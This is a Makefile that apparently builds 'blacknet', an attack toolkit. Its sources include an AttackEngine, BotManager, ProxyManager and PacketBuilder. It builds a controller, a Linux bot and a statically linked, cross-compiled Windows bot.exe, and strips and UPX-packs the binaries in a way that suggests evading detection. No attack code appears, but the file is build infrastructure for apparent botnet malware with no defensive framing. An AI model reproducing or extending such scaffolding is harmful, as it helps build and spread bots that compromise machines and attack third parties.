CC = g++
CFLAGS = -std=c++17 -O3 -march=native -pthread -Wall -Wextra -fPIC -I./include
LDFLAGS = -pthread -lcurl -lssl -lcrypto -lpthread

# Qt5 (optional — requires qtbase5-dev)
QT5_INC = $(shell pkg-config --cflags Qt5Widgets 2>/dev/null || echo "")
QT5_LIB = $(shell pkg-config --libs Qt5Widgets 2>/dev/null || echo "")

PREFIX = /usr/local
BINDIR = $(PREFIX)/bin
DATADIR = $(PREFIX)/share/blacknet

SOURCES = src/main.cpp \
          src/AttackEngine.cpp \
          src/ProtocolHandler.cpp \
          src/GeoLocator.cpp \
          src/ProxyManager.cpp \
          src/PacketBuilder.cpp \
          src/BotManager.cpp \
          src/Utilities.cpp

GUI_SOURCE = src/GUI.cpp

OBJECTS = $(SOURCES:.cpp=.o)
GUI_OBJECT = $(GUI_SOURCE:.cpp=.o)

TARGET = blacknet
GUI_TARGET = blacknet-gui
DEBUG_TARGET = blacknet.debug

BOT_TARGET = bot
BOT_SOURCE = bot.cpp

WINBOT = bot.exe

.PHONY: all gui debug winbot clean install

all: $(TARGET) $(BOT_TARGET)

# CLI-only build (no Qt5 required)
$(TARGET): $(OBJECTS)
	$(CC) $(OBJECTS) -o $@ $(LDFLAGS)
	strip $@
	-upx --best --ultra-brute $@ 2>/dev/null || true

# GUI build (requires Qt5 dev headers)
gui: CFLAGS += -DENABLE_GUI $(QT5_INC)
gui: $(OBJECTS) $(GUI_OBJECT)
	$(CC) $(OBJECTS) $(GUI_OBJECT) -o $(GUI_TARGET) $(LDFLAGS) $(QT5_LIB)
	strip $(GUI_TARGET)

# Debug build (no strip, no UPX)
debug: CFLAGS += -g -O0 -DDEBUG
debug: $(OBJECTS)
	$(CC) $(OBJECTS) -o $(DEBUG_TARGET) $(LDFLAGS)
	@echo "[+] Debug binary: $(DEBUG_TARGET)"

$(BOT_TARGET): $(BOT_SOURCE)
	$(CC) -std=c++17 -O2 -pthread -Wall -o $@ $<
	strip $@
	-upx --best $@ 2>/dev/null || true

winbot: $(WINBOT)
	@echo "[+] Windows bot compiled."

$(WINBOT): $(BOT_SOURCE)
	x86_64-w64-mingw32-g++ -std=c++17 -O2 -static -o $@ $< -lws2_32
	-upx --best $@ 2>/dev/null || true

%.o: %.cpp
	$(CC) $(CFLAGS) -c $< -o $@

clean:
	rm -f $(OBJECTS) $(GUI_OBJECT) $(TARGET) $(GUI_TARGET) $(DEBUG_TARGET) $(BOT_TARGET) $(WINBOT)

install: $(TARGET)
	cp $(TARGET) $(BINDIR)
	mkdir -p $(DATADIR)
	cp -r resources/* $(DATADIR)
